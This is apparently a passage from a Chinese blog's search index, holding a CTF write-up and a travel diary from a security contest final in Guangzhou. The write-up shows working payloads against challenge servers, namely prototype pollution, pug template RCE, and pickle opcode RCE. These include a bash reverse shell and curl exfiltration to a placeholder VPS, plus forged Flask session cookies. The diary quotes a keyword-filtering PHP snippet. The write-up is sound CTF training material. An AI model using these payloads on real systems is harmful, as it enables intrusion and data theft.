感觉还是太菜了，再次落泪（ （溜了溜了喵~","path":"2021/08/10/CTF_2021DASCTF_July_cybercms/"},{"title":"CTF | 2021 巅峰极客网络安全技能挑战赛 WriteUp","text":"引言 2021 巅峰极客网络安全技能挑战赛 比赛时间：2021年7月31日 10:00 - 18:00 https://www.ichunqiu.com/2021dfjk 上周末摸鱼，佛系打了下这个巅峰极客网络安全技能挑战赛，可是题目好难啊啊啊啊啊。 喵呜呜，题目环境当晚10点就关了就离谱，这里还是赛后复现为主，随便写写好了。 Misc签到 YY给我发了一串表情，说了GAME，这是什么意思？ 附件下载 提取码（GAME）备用下载 🙃💵🌿🎤🚪🌏🐎🥋🚫😆😍🥋🐘🍴🚰😍☀🌿😇😍😡🏎👉🛩🤣🖐💧☺🌉🏎😇😆🎈💧⏩☺🔄🌪⌨🐅🎅🙃🍌🙃🔪☂🏹🕹☃🌿🌉💵🐎🐍😇🍵😍🐅🎈🥋🚰✅🎈🎈 emoji-aes 直接用咱自己搭的了： https://emoji-aes.miaotony.xyz/ key: GAME flag{10ve_4nd_Peace} Webezjs 题目内容：简单的个人空间系统。 一个简简单单的登录界面 发现只要用户名、密码超过5位数字就能进入了。 这个图片是以 base64 编码的，可以任意读取文件。 通过报错可以得知源码在 /app/app.js 路由在 /app/routes/index.js http://eci-2ze94lqyt2mqgae0klll.cloudeci1.ichunqiu.com:8888/admin?newimg=/app/app.js&amp;diy=miaotony &lt;html&gt;&lt;head&gt;&lt;title&gt;我的空间&lt;/title&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=UTF-8\"/&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=\"\" method=\"get\"&gt; &lt;div&gt;更改图片&lt;select name=\"newimg\"&gt;&lt;option value=\"./images/1.png\"&gt;纸飞机&lt;/option&gt;&lt;option value=\"./images/2.png\"&gt;人&lt;/option&gt;&lt;option value=\"./images/3.png\"&gt;小火车&lt;/option&gt;&lt;/select&gt;&lt;/div&gt;&lt;div&gt;个性签名&lt;input type=\"text\" name=\"diy\" value=\"尊贵的admin可以在这更改个性签名\"/&gt;&lt;/div&gt;&lt;input type=\"submit\"/&gt;&lt;/form&gt;&lt;div&gt;&lt;img src='data:image/png;base64,dmFyIGNyZWF0ZUVycm9yID0gcmVxdWlyZSgnaHR0cC1lcnJvcnMnKTsKdmFyIGV4cHJlc3MgPSByZXF1aXJlKCdleHByZXNzJyk7CnZhciBwYXRoID0gcmVxdWlyZSgncGF0aCcpOwp2YXIgY29va2llUGFyc2VyID0gcmVxdWlyZSgnY29va2llLXBhcnNlcicpOwp2YXIgbG9nZ2VyID0gcmVxdWlyZSgnbW9yZ2FuJyk7CnZhciBjcnlwdG8gPSByZXF1aXJlKCdjcnlwdG8nKTsKdmFyIHNlc3Npb24gPSByZXF1aXJlKCdleHByZXNzLXNlc3Npb24nKTsKdmFyIHNlc3Npb25TdG9yZSA9IHJlcXVpcmUoJ3Nlc3Npb24tZmlsZS1zdG9yZScpKHNlc3Npb24pOwp2YXIga2V5ID0gJ3Nlc3Npb24nOwoKCnZhciBpbmRleFJvdXRlciA9IHJlcXVpcmUoJy4vcm91dGVzL2luZGV4Jyk7CnZhciBhcHAgPSBleHByZXNzKCk7CnZhciBzZWNyZXRzID0gY3J5cHRvLnJhbmRvbUJ5dGVzKDMyKS50b1N0cmluZygnaGV4Jyk7CmFwcC51c2Uoc2Vzc2lvbih7CiAgbmFtZToga2V5LAogIHNlY3JldDogc2VjcmV0cywKICBzdG9yZTogbmV3IHNlc3Npb25TdG9yZSgpLAogIHNhdmVVbmluaXRpYWxpemVkOiBmYWxzZSwKICByZXNhdmU6IGZhbHNlLAogIGNvb2tpZTogewogICAgbWF4QWdlOiAxMDAgKiA2MCAqIDYwMAogIH0KCn0pKTsKCi8vIHZpZXcgZW5naW5lIHNldHVwCmFwcC5zZXQoJ3ZpZXdzJywgcGF0aC5qb2luKF9fZGlybmFtZSwgJ3ZpZXdzJykpOwphcHAuc2V0KCd2aWV3IGVuZ2luZScsICdwdWcnKTsKCmFwcC51c2UobG9nZ2VyKCdkZXYnKSk7CmFwcC51c2UoZXhwcmVzcy51cmxlbmNvZGVkKHsgZXh0ZW5kZWQ6IGZhbHNlIH0pKTsKYXBwLnVzZShjb29raWVQYXJzZXIoKSk7CmFwcC51c2UoZXhwcmVzcy5zdGF0aWMocGF0aC5qb2luKF9fZGlybmFtZSwgJ3B1YmxpYycpKSk7CgphcHAudXNlKCcvJywgaW5kZXhSb3V0ZXIpOwoKCi8vIGNhdGNoIDQwNCBhbmQgZm9yd2FyZCB0byBlcnJvciBoYW5kbGVyCmFwcC51c2UoZnVuY3Rpb24ocmVxLCByZXMsIG5leHQpIHsKICBuZXh0KGNyZWF0ZUVycm9yKDQwNCkpOwp9KTsKCi8vIGVycm9yIGhhbmRsZXIKYXBwLnVzZShmdW5jdGlvbihlcnIsIHJlcSwgcmVzLCBuZXh0KSB7CiAgLy8gc2V0IGxvY2Fscywgb25seSBwcm92aWRpbmcgZXJyb3IgaW4gZGV2ZWxvcG1lbnQKICByZXMubG9jYWxzLm1lc3NhZ2UgPSBlcnIubWVzc2FnZTsKICByZXMubG9jYWxzLmVycm9yID0gcmVxLmFwcC5nZXQoJ2VudicpID09PSAnZGV2ZWxvcG1lbnQnID8gZXJyIDoge307CgogIC8vIHJlbmRlciB0aGUgZXJyb3IgcGFnZQogIHJlcy5zdGF0dXMoZXJyLnN0YXR1cyB8fCA1MDApOwogIHJlcy5yZW5kZXIoJ2Vycm9yJyk7Cn0pOwoKbW9kdWxlLmV4cG9ydHMgPSBhcHA7Cg=='&gt;&lt;/div&gt;&lt;p&gt;哈喽&lt;/p&gt;&lt;div&gt;miaotony&lt;/div&gt;&lt;div&gt;个性签名：&lt;div&gt;miaotony&lt;/div&gt;&lt;div&gt;---miaotony&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 依次得到源码 app.js var createError = require('http-errors'); var express = require('express'); var path = require('path'); var cookieParser = require('cookie-parser'); var logger = require('morgan'); var crypto = require('crypto'); var session = require('express-session'); var sessionStore = require('session-file-store')(session); var key = 'session'; var indexRouter = require('./routes/index'); var app = express(); var secrets = crypto.randomBytes(32).toString('hex'); app.use(session({ name: key, secret: secrets, store: new sessionStore(), saveUninitialized: false, resave: false, cookie: { maxAge: 100 * 60 * 600 } })); // view engine setup app.set('views', path.join(__dirname, 'views')); app.set('view engine', 'pug'); app.use(logger('dev')); app.use(express.urlencoded({ extended: false })); app.use(cookieParser()); app.use(express.static(path.join(__dirname, 'public'))); app.use('/', indexRouter); // catch 404 and forward to error handler app.use(function(req, res, next) { next(createError(404)); }); // error handler app.use(function(err, req, res, next) { // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get('env') === 'development' ? err : {}; // render the error page res.status(err.status || 500); res.render('error'); }); module.exports = app; routes/index.js var express = require('express'); var router = express.Router(); var {body, validationResult} = require('express-validator'); var crypto = require('crypto'); var fs = require('fs'); var validator = [ body('*').trim(), body('username').if(body('username').exists()).isLength({min: 5}) .withMessage(\"username is too short\"), body('password').if(body('password').exists()).isLength({min: 5}) .withMessage(\"password is too short\"),(req, res, next) =&gt; { const errors = validationResult(req) if (!errors.isEmpty()) { return res.status(400).render('msg', {title: 'error', msg: errors.array()[0].msg}); } next() } ]; router.use(validator); router.get('/', function(req, res, next) { return res.render('index', {title: \"登录界面\"}); }); router.post('/login', function(req, res, next) { let username = req.body.username; let password = req.body.password; if (username !== undefined &amp;&amp; password !== undefined) { if (username == \"admin\" &amp;&amp; password === crypto.randomBytes(32).toString('hex')) { req.session.username = \"admin\"; } else if (username != \"admin\"){ req.session.username = username; } else { return res.render('msg',{title: 'error', msg: 'admin password error'}); } return res.redirect('/verify'); } return res.render('msg',{title: 'error',msg: 'plz input your username and password'}); }); router.get('/verify', function(req, res, next) { console.log(req.session.username); if (req.session.username === undefined) { return res.render('msg', {title: 'error', msg: 'login first plz'}); } if (req.session.username === \"admin\") { req.session.isadmin = \"admin\"; } else { req.session.isadmin = \"notadmin\"; } return res.render('verify', {title: 'success', msg: 'verify success'}); }); router.get('/admin', function(req, res, next) { //req.session.debug = true; if (req.session.username !== undefined &amp;&amp; req.session.isadmin !== undefined) { if (req.query.newimg !== undefined) req.session.img = req.query.newimg; var imgdata = fs.readFileSync(req.session.img? req.session.img: \"./images/1.png\"); var base64data = Buffer.from(imgdata, 'binary').toString('base64'); var info = {title: '我的空间', msg: req.session.username, png: \"data:image/png;base64,\" + base64data, diy: \"十年磨一剑😅v0.0.0(尚处于开发版\"}; if (req.session.isadmin !== \"notadmin\") { if (req.session.debug !== undefined &amp;&amp; req.session.debug !== false) info.pretty = req.query.p; if (req.query.diy !== undefined) req.session.diy = req.query.diy; info.diy = req.session.diy ? req.session.diy: \"尊贵的admin\"; return res.render('admin', info); } else { return res.render('admin', info); } } else { return res.render('msg', {title: 'error', msg: 'plz login first'}); } }); module.exports = router; package.json { \"name\": \"nodejs\", \"version\": \"0.0.0\", \"private\": true, \"scripts\": { \"start\": \"node ./bin/www\" }, \"dependencies\": { \"cookie-parser\": \"~1.4.4\", \"debug\": \"~2.6.9\", \"express\": \"~4.16.1\", \"express-session\": \"^1.17.2\", \"express-validator\": \"^6.6.0\", \"http-errors\": \"~1.6.3\", \"lodash\": \"^4.17.15\", \"morgan\": \"~1.9.1\", \"pug\": \"^3.0.0\", \"pug-code-gen\": \"^3.0.0\", \"session-file-store\": \"^1.5.0\" } } package-lock.json 太长了就不放上来了。 可以看到登录验证上用了 express-validator，模板渲染用的是 pug。 nodejs 一般就找原型链污染之类的吧，分析路由源码，info.pretty = req.query.p; 这里有点可疑。 为了进到这里，需要 session 里的 debug、isadmin、username 均不是 undefined，且 isadmin !== \"notadmin\"， debug !== false。这就需要在登录路由 POST login 进行鉴权，如果能把 isadmin、debug 设置为空的话就能绕过进来了。所以还是得 原型链污染。 再看 validator 这里，body('*').trim()，express-validator 确实存在原型链污染漏洞。 参考 XNUCA2020Qualifier oooooooldjs writeup express-validator 6.6.0 原型链污染分析 当传入的键中存在. ，则会在字符两边加上[\" \"]，并且最终返回的是一个字符串形式的结果。 当我们传入： {\"\\\"].__proto__[\\\"test\":\"123 \"} 这里的键为\"].__proto__[\"test，由于字符里面存在.，所以在segments.reduce函数处理时会对其左右加双引号和中括号，最终变成：[\"\"].__proto__[\"test\"]。 而这个被污染的原型链的 test 值为空，是因为取值时，使用的是 lodash.get 方法从 req['body'] 中取被处理后的键值，处理后的键是不存在的，所以取出来的值就为 undefined。再经过.toString()的处理变成了''空字符串。 另外这篇文章中还提出了利用 lodash.get 方法来污染 value 的方法，即 {\"a\": {\"__proto__\": {\"test\": \"testvalue\"}}, \"a\\\"].__proto__[\\\"test\": 222} 最后会把 Object.__proto__.test 的值污染为 testvalue。 这道题里环境也正好是 express-validator 6.6.0，只不过不支持 JSON 来传参，只能用 urlencode 了。 于是构造 payload： \"].__proto__[\"isadmin=aaa \"].__proto__[\"debug=bbb POST /login HTTP/1.1 ... username=miaomiao&amp;password=miaomiao&amp;\"].__proto__[\"isadmin=aaa+&amp;\"].__proto__[\"debug=bbb+ 这样就能成功绕过登录成为 admin 了。 接下来带上这个 cookie 打 pug getshell。题目里用到的 pug 版本是 3.0.0 参考 Remote code execution via the pretty option. CVE-2021-21353 Code injection vulnerability in visitMixin and visitMixinBlock through “pretty” option 构造如下 payload 即可 RCE。 http://xxxxx/admin?p=');process.mainModule.constructor._load('child_process').exec('whoami');_=(' 注意不要访问 /verify 路由，不然又把 session.isadmin 赋值了。 可惜发现这题 shell 弹不回来，只能 curl 外带了。 另外由于输出换行会截断，这里给个 tip，可以通过 form-data 文件上传 再配合 base64 编码的方式来完整传输信息。 curl -F \"file=`ls -al /|base64`\" http://VPS # 或者直接 VPS 上起个 web 服务，上传文件 # curl -F \"file=@文件位置\" http://VPS # ls -al / total 84 drwxr-xr-x 1 root root 4096 Jul 31 10:28 . drwxr-xr-x 1 root root 4096 Jul 31 10:28 .. drwxrwxrwx 1 root root 4096 Jul 30 17:20 app drwxr-xr-x 2 root root 4096 Jul 23 13:50 bin drwxr-xr-x 2 root root 4096 Apr 24 2018 boot drwxr-xr-x 5 root root 380 Jul 31 10:28 dev drwxr-xr-x 1 root root 4096 Jul 30 17:20 etc -rw-r--r-- 1 root root 62 Jul 30 17:21 hint drwxr-xr-x 1 root root 4096 Jul 30 17:20 home drwxr-xr-x 1 root root 4096 Jul 30 17:20 lib drwxr-xr-x 2 root root 4096 Jul 23 13:50 lib64 drwxr-xr-x 2 root root 4096 Jul 23 13:49 media drwxr-xr-x 2 root root 4096 Jul 23 13:49 mnt drwxr-xr-x 2 root root 4096 Jul 23 13:49 opt dr-xr-xr-x 108 root root 0 Jul 31 10:28 proc drwx------ 1 root root 4096 Jul 31 10:28 root drwxr-xr-x 5 root root 4096 Jul 23 13:50 run drwxr-xr-x 2 root root 4096 Jul 23 13:50 sbin drwxr-xr-x 2 root root 4096 Jul 23 13:49 srv dr-xr-xr-x 12 root root 0 Jul 31 10:45 sys drwxrwxrwt 1 root root 4096 Jul 30 17:20 tmp drwxr-xr-x 1 root root 4096 Jul 23 13:49 usr drwxr-xr-x 1 root root 4096 Jul 23 13:50 var 当前用户是 ctf，这个 tac 配了 suid。 tac /root/flag.txt 其实本来是想能不能通过伪造 session 来成管理员的，后来发现没有上传点，么得办法了。 具体可以参考 session-file-store库的session伪造。 BTW, 原来他的模板文件在 views 目录下啊，咱一直猜着 templates template 结果一直没读到…… /app/views/admin.pug html head title= title meta(http-equiv=\"Content-Type\", content=\"text/html;charset=UTF-8\") body mixin hello(text) p= text div #{msg} mixin printdiy() div 个性签名： div #{diy} div ---#{msg} form(action=\"\", method=\"get\") div 更改图片 select(name=\"newimg\") option(value=\"./images/1.png\") 纸飞机 option(value=\"./images/2.png\") 人 option(value=\"./images/3.png\") 小火车 div 个性签名 input(type=\"text\" name=\"diy\" value=\"尊贵的admin可以在这更改个性签名\") input(type=\"submit\") div &lt;img src='#{png}'&gt; +hello(\"哈喽\") +printdiy() 顺便放个 ejs 的 RCE： Express+lodash+ejs: 从原型链污染到RCE a; return global.process.mainModule.constructor._load('child_process').execSync('whoami'); // opcode 题目内容：听说pickle是一门有趣的栈语言，你会手写opcode吗？ 任意文件读源码 imagePath=app.py&amp;password=admin&amp;username=admin from flask import Flask from flask import request from flask import render_template from flask import session import base64 import pickle import io import builtins class RestrictedUnpickler(pickle.Unpickler): blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit', 'map'} def find_class(self, module, name): if module == \"builtins\" and name not in self.blacklist: return getattr(builtins, name) raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) def loads(data): return RestrictedUnpickler(io.BytesIO(data)).load() app = Flask(__name__) app.config['SECRET_KEY'] = \"y0u-wi11_neuer_kn0vv-!@#se%32\" @app.route('/admin', methods = [\"POST\",\"GET\"]) def admin(): if('{}'.format(session['username'])!= 'admin' and str(session['username'] , encoding = \"utf-8\")!= 'admin'): return \"not admin\" try: data = base64.b64decode(session['data']) if \"R\" in data.decode(): return \"nonono\" pickle.loads(data) except Exception as e: print(e) return \"success\" @app.route('/login', methods = [\"GET\",\"POST\"]) def login(): username = request.form.get('username') password = request.form.get('password') imagePath = request.form.get('imagePath') session['username'] = username + password session['data'] = base64.b64encode(pickle.dumps('hello' + username, protocol=0)) try: f = open(imagePath,'rb').read() except Exception as e: f = open('static/image/error.png','rb').read() imageBase64 = base64.b64encode(f) return render_template(\"login.html\", username = username, password = password, data = bytes.decode(imageBase64)) @app.route('/', methods = [\"GET\",\"POST\"]) def index(): return render_template(\"index.html\") if __name__ == '__main__': app.run(host='0.0.0.0', port='8888') 参考 pickle反序列化的利用技巧总结 Python反序列化漏洞与沙箱逃逸 🐍Security Issues in Python Pickle 或者 https://hackmd.io/53c7hn_1SqOF7WoUMBrkiA?view 从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 2020 XCTF高校战“疫”网络安全分享赛 webtmp 2021 NewsCTF 新春赛 beautifulgirlfriend 又是手搓 opcode…… 实际上 INST i、OBJ o、REDUCE R 都可以调用一个 callable 对象，把 R 换成其他的就好。 然而这题其实他并没有调用外面的这个 loads，即没有调用 RestrictedUnpickler，只要不含有 R 就行了…… # 反弹 shell b\"(cos\\nsystem\\nS\\'bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\\'\\no.\" # 或者直接 b\"(cos\\nsystem\\nS\\'curl http://VPS:PORT/?flag=`/app/readflag`\\'\\no.\" 接下来伪造 session，直接用 Flask Session Cookie Decoder/Encoder 这个脚本好了。 解码： $ python3 flask_session_cookie_manager3.py decode -c 'eyJkYXRhIjp7IiBiIjoiVm0xb2JHSkhlSFpaVjFKMFlWYzBTMk5FUVV0TVp6MDkifSwidXNlcm5hbWUiOiJhZG1pbmFkbWluIn0.YQ_4Tg.rctkQrLvhZdSHjtRdjE21qaA1O4' -s 'y0u-wi11_neuer_kn0vv-!@#se%32' {'data': b'VmhlbGxvYWRtaW4KcDAKLg==', 'username': 'adminadmin'} 编码：把上面的 opcode base64 一下，然后放进 data 里。 $ python3 flask_session_cookie_manager3.py encode -s 'y0u-wi11_neuer_kn0vv-!@#se%32' -t '{\"data\": \"KGNvcwpzeXN0ZW0KUydiYXNoIC1pID4mIC9kZXYvdGNwL2lwL3BvcnQgMD4mMScKby4=\", \"username\": \"adminadmin\"}' eyJkYXRhIjoiS0dOdmN3cHplWE4wWlcwS1V5ZGlZWE5vSUMxcElENG1JQzlrWlhZdmRHTndMMmx3TDNCdmNuUWdNRDRtTVNjS2J5ND0iLCJ1c2VybmFtZSI6ImFkbWluYWRtaW4ifQ.YRAgRQ.KBVqxrhR0f5FCTCzy1sLo9oaAfI 注意改一下 ip &amp; port。然后把 cookie 改了访问 /admin 就能触发了。 如果按照题目原本的意思，只能用 builtins 里的东西，还带有黑名单，过滤 R。 可以参考 这篇 wp 里的思路，先用 pker 这个工具生成只带 builtins 但含有 R 的 payload。 先知社区：通过AST来构造Pickle opcode getattr = GLOBAL('__builtins__', 'getattr') dict = GLOBAL('__builtins__', 'dict') dict_get = getattr(dict, 'get') globals = GLOBAL('__builtins__', 'globals') __builtins__ = globals() ____builtins____ = dict_get(__builtins__, '____builtins____') eval = getattr(____builtins____, 'eval') eval('__import__(\"os\").system(\"whoami\")') return b'cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0g0\\n(g1\\nS\\'get\\'\\ntRp2\\n0cbuiltins\\nglobals\\np3\\n0g3\\n(tRp4\\n0g2\\n(g4\\nS\\'__builtins__\\'\\ntRp5\\n0g0\\n(g5\\nS\\'eval\\'\\ntRp6\\n0g6\\n(S\\'__import__(\"os\").system(\"whoami\")\\'\\ntR.' \"\"\" cbuiltins getattr p0 0cbuiltins dict p1 0g0 (g1 S'get' tRp2 0cbuiltins globals p3 0g3 (tRp4 0g2 (g4 S'__builtins__' tRp5 0g0 (g5 S'eval' tRp6 0g6 (S'__import__(\"os\").system(\"whoami\")' tR. \"\"\" 而后手搓一下，在调用的 callable 前添加 MARK 即 (，去掉 t 指令和调用 t 指令用到的 MARK. 也就是 [callable] [tuple] R ===&gt; MARK [callable] [args...] o 文中构造的 payload 为 b'''cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0(g0\\ng1\\nS'get'\\nop2\\n0cbuiltins\\nglobals\\np3\\n0(g3\\nop4\\n0(g2\\ng4\\nS'__builtins__'\\nop5\\n0(g0\\ng5\\nS'eval'\\nop6\\n0(g6\\nS'__import__(\"os\").system(\"whoami\")'\\no.''' \"\"\" cbuiltins getattr p0 0cbuiltins dict p1 0(g0 g1 S'get' op2 0cbuiltins globals p3 0(g3 op4 0(g2 g4 S'__builtins__' op5 0(g0 g5 S'eval' op6 0(g6 S'__import__(\"os\").system(\"whoami\")' o. \"\"\" 编码 $ python3 flask_session_cookie_manager3.py encode -s 'y0u-wi11_neuer_kn0vv-!@#se%32' -t '{\"data\": \"Y2J1aWx0aW5zCmdldGF0dHIKcDAKMGNidWlsdGlucwpkaWN0CnAxCjAoZzAKZzEKUydnZXQnCm9wMgowY2J1aWx0aW5zCmdsb2JhbHMKcDMKMChnMwpvcDQKMChnMgpnNApTJ19fYnVpbHRpbnNfXycKb3A1CjAoZzAKZzUKUydldmFsJwpvcDYKMChnNgpTJ19faW1wb3J0X18oIm9zIikuc3lzdGVtKCJ3aG9hbWkiKScKby4=\", \"username\": \"adminadmin\"}' .eJxdkEFPgzAAhf9Lzx5gaDJMPDSdA9qUZOpW4NbSDRhtaWTIqPG_y9jBxMvLu3zfS943kPzCwTPIV9jn7Opx9uSQlkpGW0_GCSk3kNAobSRTvYzUUI625Sz1kIFXdIZd4SAp3CvZT9IU2c4gHY606sZ_vl6scC1iOvsooag2dLRf5WZ375U1KbQf2A9PuTlYEb9ZYdJTNpVEBND_29nfdpTU2x4vfL7waXVnOfNHEWAv89ddokOXNO1QBsrJ6HAhCAc8CmvB2oa8z97p8QU8gKE_fhquj_MDXOrGLAF-fgETQV-m.YRAnmg.C8b2ylZD1EDOLC3JLOFLZP9VGms 然后把源码里的 pickle.loads(data) 改成 loads(data)，本地试一试。 Pickle 常见 opcode，完整的可在$PYTHON/Lib/pickle.py查看 (via https://xz.aliyun.com/t/7012#toc-2) name op params describe e.g. REDUCE R [callable] [tuple] R 调用一个callable对象 crandom\\nRandom\\n)R OBJ o MARK [callable] [args…] o 同INST，参数获取方式由readline变为stack.pop而已 (cos\\nsystem\\nS’ls’\\no INST i MARK [args…] i [module] [cls] 构造一个类实例（其实等同于调用一个callable对象），内部调用了find_class (S’ls’\\nios\\nsystem\\n MARK ( null 向栈顶push一个MARK STOP . null 结束 POP 0 null 丢弃栈顶第一个元素 POP_MARK 1 null 丢弃栈顶到MARK之上的第一个元素 DUP 2 null 在栈顶赋值一次栈顶元素 FLOAT F F [float] push一个float F1.0 INT I I [int] push一个integer I1 NONE N null push一个None STRING S S [string] push一个string S ‘x’ UNICODE V V [unicode] push一个unicode string V ‘x’ APPEND a [list] [obj] a 向列表append单个对象 ]I100\\na BUILD b [obj] [dict] b 添加实例属性（修改__dict__） cmodule\\nCls\\n)R(I1\\nI2\\ndb GLOBAL c c [module] [name] 调用Pickler的find_class，导入module.name并push到栈顶 cos\\nsystem\\n DICT d MARK [[k] [v]…] d 将栈顶MARK以前的元素弹出构造dict，再push回栈顶 (I0\\nI1\\nd EMPTY_DICT } null push一个空dict APPENDS e [list] MARK [obj…] e 将栈顶MARK以前的元素append到前一个的list ](I0\\ne GET g g [index] 从memo获取元素 g0 LIST l MARK [obj] l 将栈顶MARK以前的元素弹出构造一个list，再push回栈顶 (I0\\nl EMPTY_LIST ] null push一个空list PUT p p [index] 将栈顶元素放入memo p0 SETITEM s [dict] [k] [v] s 设置dict的键值 }I0\\nI1\\ns TUPLE t MARK [obj…] t 将栈顶MARK以前的元素弹出构造tuple，再push回栈顶 (I0\\nI1\\nt EMPTY_TUPLE ) null push一个空tuple SETITEMS u [dict] MARK [[k] [v]…] u 将栈顶MARK以前的元素弹出update到前一个dict }(I0\\nI1\\nu 小结题目也太顶啦！ Misc 就俩题，另一题是个零解的内存镜像取证，提取出来一张微信收到的图片，然后 LSB 有个看上去像是 AES 的字符串，但找了半天没找到密钥在哪…… 线上初赛才只有12支战队晋级，太难了，喵呜呜呜！ 就这样吧…… （溜了溜了喵 --&gt;","path":"2021/08/07/CTF_2021dianfengjike/"},{"title":"碎碎念 | 2021 红帽杯 网络安全大赛总决赛 广州游记","text":"本文谢绝转载！ 引言前几天去广东省广州市打了个 第四届 红帽杯 网络安全大赛总决赛，顺便就在广州随便转了转。 难得有机会进了线下，可惜队友因为疫情都在南京出不来了，只有喵喵没南京旅居史，于是就一个人去摸鱼了 2333. 这篇主要就是喵喵在广州的游记啦！ ！！！多 图 预 警！！！ ！！！流 量 预 警！！！ 比赛赛制比赛的话就 24 号一天，从早上 11:15 打到 下午 17:15，时长 6h，这个比赛时间就很迷，想不到吧。 这次是喵喵第一次打 AWD plus 赛制，攻击分和防御分分别计算而后加在一起，选手没有对靶机的控制权，全程不接触 ssh。 就是觉得没那么有意思，其实就和解题 break + 修复 fix 差不多了，缺少了点对抗的味道了。只不过多了个轮次的概念，每个战队初始积分 5000 分，20 min/轮次，如果提交 flag 正确即 break 成功的话，平台每轮会自动攻击其他未修补漏洞的战队，把动态的积分给本队。与其说是攻击，平台技术层面感觉其实就是看有多少队没 fix 罢了。这里的动态积分和解出 flag 的队伍数、难度系数、解题时间有关。 Fix 的话，是通过 ftp 上传一个带有 update.sh 文件的 xxx.tar.gz 压缩包进行的，通过类似 mv -f xxx /var/www/html/xxx 的操作把文件覆盖掉从而进行修改。申请验证之后平台会用 check 和 exp 去测试这个环境，如果 check 成功而 exp 失败，就认为 fix 成功了；如果二者都成功，说明 fix 失败；如果 check 失败了，就说明修炸了，还反而会每轮扣 200 分。 其实这样的赛制对平台而言就很友好了，毕竟少了队伍之间直接的激烈的流量交互，资源消耗就大幅度减少了。每个战队每题一个独享环境，fix 的 check 环节整几个公共环境，大家排个队验证就完事了，break、fix 的成功与否整几个标志位，再加上一套判分逻辑就差不多了。 （当然这里只是咱随便猜想而已啦，真实场景肯定要比这个复杂 题目说完了赛制下面就要说 比赛题目 了。瞎鸡儿唠嗑几句，不想看的话就跳过吧。 这次算是 3 web + 3 pwn 吧，虽然不知道有个 golang 的 web 是不是也和 binary 有关。 可惜的是比赛开始前几天南京突发了新冠疫情，正好队友 pwn👴🏻们都在南京出不来，最后只剩下喵喵一个人自己摸鱼了，没人一起聊天一起🤺，硬是坐了一天，也太难受了。（摊手 Web 的话，出了个 upload 上传，其中有个从 SESSION 中取出函数名执行，寻思着可能是命令执行，咱就过滤了几个 命令执行 的关键函数然后就 fix 成功了。有的师傅 过滤掉 ../ 也修成功了。 break 的话比赛的时候还在想是不是类似于 TCTF 2021 那个 session 上传，但又不会玩……最后确实是这样，通过 ../ 目录穿越直接构造 session 上传写到 /tmp 下然后调用吧。 此外有个 cms，opensns，基于 ThinkPHP 二次开发的。这题气死了，他给的文件有个 log 里面就有 payload，peiqi wiki 文库里也有现成 payload。喵喵下载下来了然而 VS Code 搜索出来了一堆冗余信息，于是一直在试 SQL 注入的洞，这个前台 RCE 的洞就没发现，然后审了半天源码也没找到洞……赛后听其他队师傅说现成 1day 直接心态炸了，草。 还有个 golang 写的程序，flag 存在 root 用户 ssh 的密码上，外面是一层 JWT 鉴权，鉴权通过之后可以执行命令，好像是存在任意文件读取，寻思着应该得通过啥办法读到 JWT 的密钥然后改成 admin 这样再进一步操作吧，等大师傅们的 wp 了。这题远程是直接一个 binary 可执行程序跑起来的，其他师傅说给的源码里的 binary 是 macOS 下生成的，和远程还不一样，现场又没给 golang 环境，咱不会修也没法修，喵呜…… 不过这个 fix 的话其实有点迷，毕竟只需要官方的 exp 打不通就判定修成功了。于是有的师傅直接整了个通防，比如请求参数里存在命令执行，或者 flag 之类的关键字，直接 die 就完事了。 这里顺便放个 T4rn 师傅的通防。 if (preg_match('/system|tail|flag|exec|base64/i', $_SERVER['REQUEST_URI'])) { die('no!'); } $str =\"\"; foreach ($_POST as $key =&gt; $value) { $str.=$key; $str.=$value; } if (preg_match(\"/system|tail|flag|exec|base64/i\", $str)) { die('no!'); } 可执行程序的 fix 参考脚本。 # update.sh cp ./修改后编译好的文件 /编译文件的目录 ps -ef |grep 编译的名字| awk '{print $2}' | xargs kill -9 cd /编译文件目录 &amp;&amp;./执行编译文件 &gt; /dev/null 2&gt;&amp;1 后面有环境有可能的话再复现一下写篇博客吧，如果不咕的话。 Pwn 题的话，喵喵不会 binary 啊啊啊啊啊啊！有个 rust 逆向，有个 python 写的编译器，还有个 http 服务的堆题（还是赛后问别的师傅才知道是个堆题，只不过把菜单换成了 HTTP server 罢了），唉。 噢，这个比赛线下是收了手机不能上网的，难受死了啊啊啊啊啊啊！（虽然听说照样有队伍成功出到外网去了 看着就绝望（ 还好没爆零（摊手 其他比赛结束后有个 舞蹈表演，舞台灯光啥的还是挺到位的，其他比赛快学一学。 （可惜就这一个节目 233 以及，大家打开手机的闪光灯，原来这个就叫做 星空大合影 啊。 最关键是嫖键盘喵！ 红帽杯限量版机械键盘！ 是黑轴，用起来感觉还是挺香的，现在就用这个键盘码字呢（ 面基这次面基了 水函、T4rn、keer、芋头、batkiz、Nohn… 可惜比赛结束得太快，有几个师傅约了但没面上，呜呜。 线下和师傅们面基的时候倒没啥合影，只有 tg 这边神秘的面基仪式了。 游玩下面就凌乱地写一下游记吧。 在路边发现了有一定年纪的 IC 卡公用电话，可惜貌似无法使用了。 晚上去了市中心，顺着花城广场一路逛到了广州塔，也就是小蛮腰，顺便看了珠江。 过了个珠江，就到了广州塔脚下。 当然还有熄灯后的。 广州塔观光门票挺贵的（ 打卡了 主办方投的大屏广告。 珠江。 这个 APM 自动旅客输送系统 挺有意思的。 其实也是地铁，只是就两节车厢，算是自动驾驶吧。不过其实还是有个师傅在车上看着的，师傅还说，要是有一天不需要有人在车上守着了，那才是真正的自动驾驶了。2333 广州塔前的有轨电车 路上的公交无轨电车 广州还有 书报亭 唉 地铁1号线 站台和车厢一看就历史悠久了。 一路上的 骑楼 始于公元前214年的 北京路，历史真悠久啊。 饱经历史沧桑的 沙面岛，挺多来这拍照打卡的，还有带着各种摄影大炮的。 波兰驻广州总领事馆现在就在岛上，门口左右还有俩战士执勤的，那门口不能拍照 还有外国人在唱英文歌（唱的啥忘了 当然还少不了 吸喵喵 啦~ （是两只在 喵呜 的喵喵 